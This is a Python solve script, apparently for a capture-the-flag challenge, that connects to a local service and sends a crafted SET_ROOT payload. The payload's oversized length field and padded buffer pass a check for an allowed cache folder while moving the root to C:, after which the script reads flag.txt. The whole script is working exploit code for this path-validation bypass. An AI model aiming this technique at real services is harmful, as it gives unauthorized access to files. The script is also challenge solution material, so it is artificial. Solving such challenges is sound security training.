#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import time


ALLOWED_ROOT = r"\??\C:\ProgramData\VStorCache\cache"
TARGET_ROOT = r"\??\C:"


class Conn:
    def __init__(self, host: str, port: int, timeout: float):
        self.sock = socket.create_connection((host, port), timeout)
        self.sock.settimeout(timeout)
        self.buf = b""

    def close(self) -> None:
        self.sock.close()

    def recv_until(self, needle: bytes) -> bytes:
        while needle not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed while waiting for {needle!r}")
            self.buf += chunk
        idx = self.buf.index(needle) + len(needle)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def sendline(self, data: bytes) -> None:
        self.sock.sendall(data + b"\n")


def wide(s: str) -> bytes:
    return s.encode("utf-16le")


def build_set_root_payload() -> bytes:
    scratch = bytearray(0x100)
    prefix = wide(ALLOWED_ROOT + r"\ok")
    scratch[: len(prefix)] = prefix

    source = wide(TARGET_ROOT + "\x00")
    body = bytes(scratch) + source

    return struct.pack("<I", 0xFFFF) + body


def exploit(host: str, port: int, timeout: float) -> bytes:
    io = Conn(host, port, timeout)
    try:
        banner = io.recv_until(b"> ")
        sys.stderr.write(banner.decode("utf-8", "replace"))

        payload = build_set_root_payload()
        io.sendline(b"1")
        io.recv_until(b"hex bytes: ")
        io.sendline(payload.hex().encode())
        update_reply = io.recv_until(b"> ")
        sys.stderr.write(update_reply.decode("utf-8", "replace"))
        if b"ok" not in update_reply:
            raise RuntimeError("SET_ROOT failed")

        io.sendline(b"2")
        io.recv_until(b"name: ")
        io.sendline(b"flag.txt")
        data = io.recv_until(b"\n> ")
        return data[:-3].rstrip(b"\r\n")
    finally:
        io.close()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=31337)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--retries", type=int, default=1)
    args = parser.parse_args()

    last = None
    for attempt in range(args.retries):
        try:
            flag = exploit(args.host, args.port, args.timeout)
            print(flag.decode("utf-8", "replace"))
            return 0
        except Exception as exc:
            last = exc
            if attempt + 1 < args.retries:
                time.sleep(2)

    print(f"solve failed: {last}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
